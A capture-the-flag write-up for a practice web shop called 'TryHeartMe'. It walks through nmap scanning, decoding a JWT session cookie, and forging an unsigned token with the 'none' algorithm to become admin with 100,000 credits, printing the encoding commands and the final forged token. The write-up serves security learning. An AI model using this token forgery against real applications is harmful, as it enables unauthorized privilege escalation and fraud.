# SOLUTION TO TRYHEARTME

The TryHeartMe shop is open for business. Can you find a way to purchase the hidden “Valenflag” item?

## 1. Executive Summary

    During the assessment of the "TryHeartMe" machine (IP: 10.49.133.21), initial enumeration revealed a web application running on port 5000. After registering/logging in, a session cookie was discovered. Through analysis and decoding, the cookie was identified as a JSON Web Token (JWT) rather than a standard Flask session cookie. The token was successfully forged using the "none" algorithm bypass vulnerability, allowing for privilege escalation to the admin role and arbitrary modification of account credits.

## 2. Reconnaissance & Enumeration

    2.1 Port Scanning
    The assessment began with an aggressive Nmap scan to map the external attack surface.

    Command Used:
    
    Bash
    nmap -T4 -Pn -A 10.49.133.21 -oN nmap.txt
    Results:
    
    Port 22/tcp: OpenSSH 9.6p1 (Ubuntu)
    
    Port 5000/tcp: Werkzeug httpd 3.0.1 (Python 3.12.3) - Title: TryHeartMe — Shop
    
    Initial Assessment:
    My initial hypothesis was that the service versions themselves (OpenSSH or Werkzeug) might contain known CVEs. However, further investigation indicated that these services were up-to-date and not the intended vulnerability vectors. The focus shifted entirely to the logical flow of the web application on port 5000.
    
## 3. Vulnerability Discovery

### 3.1 Application Interaction
    I navigated to the web application and successfully logged in as a standard user. Upon inspecting the browser's storage, I discovered a session cookie being used for authentication and state management.
    
### 3.2 Token Analysis & Decoding Attempts
    Because the application was running on Werkzeug/Python, my initial assumption was that the cookie was a standard Flask cryptographically signed session cookie.
    
        Attempt 1 (flask-unsign): I attempted to decode the cookie using flask-unsign. This tool only successfully parsed the first segment of the cookie, indicating it was not a standard Flask token.
                
                Attempt 2 (Standard Base64): Standard Base64 decoding attempts yielded similar fragmented results.
                
                Attempt 3 (UTF-8 Decoding): By properly decoding the segments using UTF-8, the structure of the token was fully revealed as a JSON Web Token (JWT).
                
                Decoded JWT Structure:
                
                Header: {"alg":"HS256","typ":"JWT"}
                
                Payload: {"email":"wee@gmail.com","role":"user","credits":0,"iat":1782316497,"theme":"valentine"}
                
                Signature: 8ᵲT%5$0[q7itE` (Binary hash data)

## 4. Exploitation

### 4.1 Vulnerability Identification
    The token used the HS256 symmetric encryption algorithm. After an unsuccessful attempt to brute-force the secret key using Hashcat and the rockyou.txt wordlist, I pivoted to testing for the JWT "None" Algorithm Bypass. This vulnerability occurs when a server blindly trusts a token's header and fails to enforce signature verification when the algorithm is set to none.
    
### 4.2 Payload Forgery
    To exploit this logic flaw, I manipulated both the header and the payload of the JWT.
    
    Modified Header:
    Changed the algorithm to none.
    
    JSON
    {"alg":"none","typ":"JWT"}
    Modified Payload:
    Elevated the role from user to admin and manipulated the credits value from 0 to 100000.
    
    JSON
    {"email":"wee@gmail.com","role":"admin","credits":100000,"iat":1782316497,"theme":"valentine"}

### 4.3 URL-Safe Base64 Encoding
    To inject the forged token back into the HTTP request, the modified JSON strings had to be converted into URL-Safe Base64 (replacing + and / with - and _, and stripping = padding).
    
    Encoding Execution:
    
    Bash
    ### Header
    echo -n '{"alg":"none","typ":"JWT"}' | base64 -w 0 | tr '+/' '-_' | tr -d '='
    ### Payload
    echo -n '{"email":"wee@gmail.com","role":"admin","credits":100000,"iat":1782316497,"theme":"valentine"}' | base64 -w 0 | tr '+/' '-_' | tr -d '='
    Final Forged JWT:
    
    Plaintext
    eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJlbWFpbCI6IndlZUBnbWFpbC5jb20iLCJyb2xlIjoiYWRtaW4iLCJjcmVkaXRzIjoxMDAwMDAsImlhdCI6MTc4MjMxNjQ5NywidGhlbWUiOiJ2YWxlbnRpbmUifQ.
    (Note the trailing period indicating an empty signature).
    
### 4.4 Execution

    I replaced my active session cookie in the browser with the newly forged JWT and refreshed the page. The application accepted the unsigned token, successfully granting me administrative privileges and 100,000 account credits.
    
## 5. Lessons Learned

    - Service Versions vs. App Logic: Up-to-date services in a CTF usually indicate that the intended path requires interacting with the custom application logic rather than finding an off-the-shelf exploit.

    - Token Identification: Not all Python web apps use Flask session cookies. Identifying the specific token structure (Header.Payload.Signature) early is crucial to selecting the right tools.

    - Data Serialization: Understanding why data is encoded (URL-Safe Base64) is just as important as knowing how to encode it, ensuring the payload survives HTTP transport without syntax errors.
